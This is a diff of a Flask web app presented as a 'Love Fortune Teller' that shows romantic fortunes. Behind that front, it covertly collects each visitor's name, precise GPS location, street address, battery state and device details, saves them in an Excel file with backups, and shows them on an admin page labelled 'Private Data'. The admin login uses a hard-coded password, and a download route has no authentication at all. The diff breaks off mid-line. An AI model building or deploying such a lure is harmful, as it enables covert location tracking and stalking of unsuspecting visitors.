@@ -4,15 +4,18 @@ import pandas as pd
 import requests
 import os
 import random
+import shutil
 from datetime import datetime
 
 app = Flask(__name__)
 CORS(app)
 
-EXCEL_FILE = '/tmp/fortunes_data.xlsx'
-ADMIN_PASSWORD = 'admin123'
+# PERMANENT STORAGE
+EXCEL_FILE = 'fortunes_data.xlsx'
+BACKUP_FILE = 'fortunes_data_backup.xlsx'
+ADMIN_PASSWORD = 'murali143'
 
-def init_excel():
+def ensure_persistent_storage():
     if not os.path.exists(EXCEL_FILE):
         df = pd.DataFrame(columns=[
             'DateTime', 'Name', 'Latitude', 'Longitude',
@@ -20,20 +23,85 @@ def init_excel():
             'Battery_%', 'Charging', 'Device', 'Screen', 'Platform'
         ])
         df.to_excel(EXCEL_FILE, index=False)
+        print("✅ Created permanent Excel")
+    
+    if os.path.exists(EXCEL_FILE) and not os.path.exists(BACKUP_FILE):
+        shutil.copy2(EXCEL_FILE, BACKUP_FILE)
+        print("✅ Backup created")
+
+def load_data():
+    ensure_persistent_storage()
+    for file_path in [EXCEL_FILE, BACKUP_FILE]:
+        if os.path.exists(file_path):
+            try:
+                df = pd.read_excel(file_path)
+                print(f"✅ Loaded {len(df)} permanent records")
+                return df
+            except:
+                continue
+    ensure_persistent_storage()
+    return pd.read_excel(EXCEL_FILE)
+
+def save_data_permanent(data):
+    df = load_data()
+    new_row = pd.DataFrame([data])
+    df = pd.concat([df, new_row], ignore_index=True)
+    df.to_excel(EXCEL_FILE, index=False)
+    shutil.copy2(EXCEL_FILE, BACKUP_FILE)
+    os.sync()  # FORCE PERMANENT DISK WRITE
+    print(f"✅ SAVED PERMANENT: {data['Name']} | Total: {len(df)}")
+    return True
 
 def geocode_reverse(lat, lon):
     try:
         url = "https://nominatim.openstreetmap.org/reverse"
-        params = {'lat': lat, 'lon': lon, 'format': 'json', 'addressdetails': 1, 'zoom': 18, 'accept-language': 'en'}
-        headers = {'User-Agent': 'LoveFortuneTeller/1.0 (your-email@gmail.com)'}
-        r = requests.get(url, params=params, headers=headers, timeout=10)
+        params = {'lat': lat, 'lon': lon, 'format': 'json', 'zoom': 18}
+        headers = {'User-Agent': 'LoveFortuneTeller/1.0'}
+        r = requests.get(url, params=params, headers=headers, timeout=8)
         if r.status_code == 200:
-            data = r.json()
-            return data.get('display_name', f"Coordinates: {lat:.4f}, {lon:.4f}")[:200]
-        return f"Location: {lat:.4f}, {lon:.4f}"
+            return r.json().get('display_name', f"{lat:.4f}, {lon:.4f}")[:200]
+        return f"{lat:.4f}, {lon:.4f}"
     except:
-        return f"Location: {lat:.4f}, {lon:.4f}"
+        return f"{lat:.4f}, {lon:.4f}"
 
+# 30+ ROMANTIC FORTUNES
+FORTUNES = [
+    "💕 Dear {name}, someone special is thinking of you right now!",
+    "💖 {name}, a beautiful soul is about to enter your life!",
+    "💗 {name}, the universe has heard your heart's desire!",
+    "💓 {name}, your soulmate is closer than you think!",
+    "💝 Someone you meet very soon will change your life, {name}!",
+    "💕 Love is rushing toward you faster than you know, {name}!",
+    "💖 {name}, your positive energy is attracting true love!",
+    "💗 The stars are perfectly aligned just for you today, {name}!",
+    "💓 {name}, a wonderful surprise is waiting for your heart!",
+    "💝 {name}, someone is secretly falling for you right now!",
+    "🌟 {name}, today a chance encounter will spark something magical!",
+    "🌙 {name}, the moon whispers your name — love is near.",
+    "✨ A stranger will smile at you in a way that feels like home, {name}.",
+    "🍃 {name}, let go of the past — your next chapter is beautiful.",
+    "💌 Check your messages soon, {name}; someone has been wanting to text you.",
+    "🎶 {name}, a song you love will remind you of someone who loves you.",
+    "🌸 Spring brings new beginnings, and for you, a fresh romance, {name}.",
+    "💎 {name}, you are more precious than you know — someone agrees.",
+    "🕯️ An old friend will become something more, {name}. Stay open.",
+    "🌊 {name}, your emotions are deep and beautiful — someone will dive in.",
+    "🍀 Lucky in love? Very soon, yes — the stars guarantee it, {name}!",
+    "📖 {name}, your love story is being written right now. It's a bestseller.",
+    "🏹 Cupid's arrow is aiming for your heart, {name}. Embrace it!",
+    "💬 A late-night conversation will reveal mutual feelings, {name}.",
+    "🎁 Unexpected gift of affection coming your way, {name}.",
+    "🌹 Roses are red, violets are blue — someone writes poems for you, {name}.",
+    "🌟 {name}, your vibe attracts your tribe — and a special someone.",
+    "💭 {name}, if you've been thinking about them, they've been thinking about you.",
+    "🔥 Passion ignites where you least expect it, {name}. Be present.",
+    "💫 The universe just nudged fate toward you, {name}. Watch for signs.",
+    "🍂 Even autumn leaves know change brings love — your turn, {name}.",
+    "🧡 {name}, a heart-to-heart talk will clear the way for romance.",
+    "🎈 {name}, something light and joyful is drifting toward your love life."
+]
+
+# COMPLETE HTML (your exact romantic UI)
 HTML = '''<!DOCTYPE html>
 <html>
 <head>
@@ -41,7 +109,6 @@ HTML = '''<!DOCTYPE html>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Love Fortune Teller</title>
 <style>
-/* === your existing CSS (unchanged) === */
 *{margin:0;padding:0;box-sizing:border-box;}
 body{font-family:'Segoe UI',sans-serif;background:linear-gradient(135deg,#ff9a9e,#fecfef,#ffdde1);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;overflow-x:hidden;}
 .heart{position:fixed;pointer-events:none;z-index:0;animation:floatUp 4s linear infinite;}
@@ -172,156 +239,4 @@ function askLocation(){
   );
 }
 function showOverlay(){document.getElementById('overlay').classList.add('show');}
-window.retry=function(){document.getElementById('form').style.display='none';askLocation();};
-</script>
-</body>
-</html>'''
-
-@app.route('/')
-def home():
-    return HTML
-
-@app.route('/save', methods=['POST'])
-def save_data():
-    init_excel()
-    try:
-        data = request.json
-        lat = data['latitude']
-        lon = data['longitude']
-        address = geocode_reverse(lat, lon)
-        google_maps_link = f"https://www.google.com/maps?q={lat},{lon}"
-
-        new_row = pd.DataFrame([{
-            'DateTime': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
-            'Name': data['name'],
-            'Latitude': lat,
-            'Longitude': lon,
-            'Google Maps': google_maps_link,
-            'Accuracy_m': data['accuracy'],
-            'Address': address,
-            'Battery_%': data['battery_level'],
-            'Charging': data['battery_charging'],
-            'Device': data['userAgent'][:150],
-            'Screen': data['screen'],
-            'Platform': data['platform']
-        }])
-
-        df = pd.read_excel(EXCEL_FILE)
-        df = pd.concat([df, new_row], ignore_index=True)
-        df.to_excel(EXCEL_FILE, index=False)
-
-        # ========== FORTUNES (expanded to 30+ messages) ==========
-        fortunes = [
-            f"💕 Dear {data['name']}, someone special is thinking of you right now!",
-            f"💖 {data['name']}, a beautiful soul is about to enter your life!",
-            f"💗 {data['name']}, the universe has heard your heart's desire!",
-            f"💓 {data['name']}, your soulmate is closer than you think!",
-            f"💝 Someone you meet very soon will change your life, {data['name']}!",
-            f"💕 Love is rushing toward you faster than you know, {data['name']}!",
-            f"💖 {data['name']}, your positive energy is attracting true love!",
-            f"💗 The stars are perfectly aligned just for you today, {data['name']}!",
-            f"💓 {data['name']}, a wonderful surprise is waiting for your heart!",
-            f"💝 {data['name']}, someone is secretly falling for you right now!",
-
-            # ---- additional romantic fortunes ----
-            f"🌟 {data['name']}, today a chance encounter will spark something magical!",
-            f"🌙 {data['name']}, the moon whispers your name — love is near.",
-            f"✨ A stranger will smile at you in a way that feels like home, {data['name']}.",
-            f"🍃 {data['name']}, let go of the past — your next chapter is beautiful.",
-            f"💌 Check your messages soon, {data['name']}; someone has been wanting to text you.",
-            f"🎶 {data['name']}, a song you love will remind you of someone who loves you.",
-            f"🌸 Spring brings new beginnings, and for you, a fresh romance, {data['name']}.",
-            f"💎 {data['name']}, you are more precious than you know — someone agrees.",
-            f"🕯️ An old friend will become something more, {data['name']}. Stay open.",
-            f"🌊 {data['name']}, your emotions are deep and beautiful — someone will dive in.",
-            f"🍀 Lucky in love? Very soon, yes — the stars guarantee it, {data['name']}!",
-            f"📖 {data['name']}, your love story is being written right now. It's a bestseller.",
-            f"🏹 Cupid's arrow is aiming for your heart, {data['name']}. Duck? No, embrace it!",
-            f"💬 A late‑night conversation will reveal mutual feelings, {data['name']}.",
-            f"🎁 Unexpected gift of affection coming your way, {data['name']}. Open your heart.",
-            f"🌹 Roses are red, violets are blue — someone is writing a poem just for you, {data['name']}.",
-            f"🌟 {data['name']}, your vibe attracts your tribe — and a special someone.",
-            f"💭 {data['name']}, if you've been thinking about them, they've been thinking about you.",
-            f"🔥 Passion ignites where you least expect it, {data['name']}. Be present.",
-            f"💫 The universe just nudged fate toward you, {data['name']}. Watch for signs.",
-            f"🍂 Even the autumn leaves know that change brings love — your turn, {data['name']}.",
-            f"🧡 {data['name']}, a heart‑to‑heart talk will clear the way for romance.",
-            f"🎈 {data['name']}, something light and joyful is drifting toward your love life.",
-            f"🪷 Like a lotus, your love will bloom in its own time — but soon, {data['name']}.",
-            f"🔮 {data['name']}, I see a spark between you and someone you already know.",
-            f"💪 {data['name']}, you are strong enough to love again, and someone is waiting.",
-            f"🎨 {data['name']}, your creativity will attract an admirer. Show your art.",
-            f"🌄 Every sunset brings the promise of a new dawn — love is dawning for you, {data['name']}.",
-            f"💐 A bouquet of compliments will come your way today, {data['name']}. Accept them.",
-            f"🍫 Sweetness is coming — not just in chocolate, but in affection, {data['name']}."
-        ]
-        # =======================================================
-
-        fortune = random.choice(fortunes)
-        print(f"✅ Saved: {data['name']} | {lat:.4f},{lon:.4f}")
-        return jsonify({'saved': True, 'fortune': fortune})
-    except Exception as e:
-        print("ERR:", e)
-        return jsonify({'saved': False}), 500
-
-@app.route('/admin', methods=['GET','POST'])
-def admin():
-    if request.method == 'GET':
-        return '''<!DOCTYPE html>
-<html><head><meta charset="UTF-8">
-<style>
-*{margin:0;padding:0;box-sizing:border-box;}
-body{font-family:sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;background:linear-gradient(135deg,#ff9a9e,#fecfef);}
-.card{background:#fff;padding:45px 40px;border-radius:24px;box-shadow:0 10px 30px rgba(0,0,0,0.12);text-align:center;width:320px;}
-h2{color:#c06c84;margin-bottom:24px;font-size:22px;}
-input{width:100%;padding:13px 18px;border:2px solid #ffdde1;border-radius:40px;font-size:15px;text-align:center;outline:none;margin-bottom:16px;}
-input:focus{border-color:#c06c84;}
-button{width:100%;padding:13px;background:linear-gradient(135deg,#ff6b6b,#c06c84);color:#fff;border:none;border-radius:40px;font-size:16px;font-weight:bold;cursor:pointer;}
-</style></head>
-<body>
-<div class="card"><h2>🔒 Admin Access</h2><form method="POST"><input name="password" type="password" placeholder="Enter password" required><button type="submit">Login</button></form></div>
-</body></html>'''
-    if request.form.get('password') != ADMIN_PASSWORD:
-        abort(403)
-    init_excel()
-    df = pd.read_excel(EXCEL_FILE)
-    rows = ''
-    for _, row in df.iterrows():
-        gps = f"{row['Latitude']:.4f}, {row['Longitude']:.4f}"
-        maps = row['Google Maps']
-        rows += f'''<tr>
-            <td>{row['DateTime']}</td>
-            <td><b>{row['Name']}</b></td>
-            <td><a href="{maps}" target="_blank">📍 {gps}</a></td>
-            <td style="max-width:280px; font-size:11px;">{row['Address']}</td>
-            <td>{row['Accuracy_m']} m</td>
-            <td>{row['Battery_%']}%</td>
-            <td>{row['Charging']}</td>
-            <td style="max-width:200px; font-size:10px;">{row['Device']}</td>
-            <td>{row['Screen']}</td>
-            <td>{row['Platform']}</td>
-        </tr>'''
-    return f'''<!DOCTYPE html>
-<html><head><meta charset="UTF-8"><style>
-body{{font-family:sans-serif;padding:20px;background:#fff0f5;}}
-h1{{color:#c06c84;}}
-table{{width:100%;border-collapse:collapse;background:#fff;border-radius:15px;overflow-x:auto;display:block;}}
-th{{background:linear-gradient(135deg,#ff6b6b,#c06c84);color:#fff;padding:12px 14px;text-align:left;font-size:12px;}}
-td{{padding:8px 12px;border-bottom:1px solid #ffe0e9;font-size:11px;}}
-tr:hover td{{background:#fff5f8;}}
-a{{color:#c06c84;text-decoration:none;}}
-</style></head>
-<body><h1>💋 Private Data — {len(df)} entries</h1>
-<div style="overflow-x:auto;"><table><thead><tr><th>DateTime</th><th>Name</th><th>Location</th><th>Address</th><th>Accuracy</th><th>Battery%</th><th>Charging</th><th>Device</th><th>Screen</th><th>Platform</th></tr></thead><tbody>{rows}</tbody></table></div>
-<p><a href="/download-excel">📥 Download Excel file</a></p></body></html>'''
-
-@app.route('/download-excel', methods=['GET'])
-def download_excel():
-    if os.path.exists(EXCEL_FILE):
-        return send_file(EXCEL_FILE, as_attachment=True, download_name='fortunes_data.xlsx')
-    return "No data yet", 404
-
-if __name__ == '__main__':
-    init_excel()
-    port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port)
+window.retry=function(){document.getElementById('form').style.display='
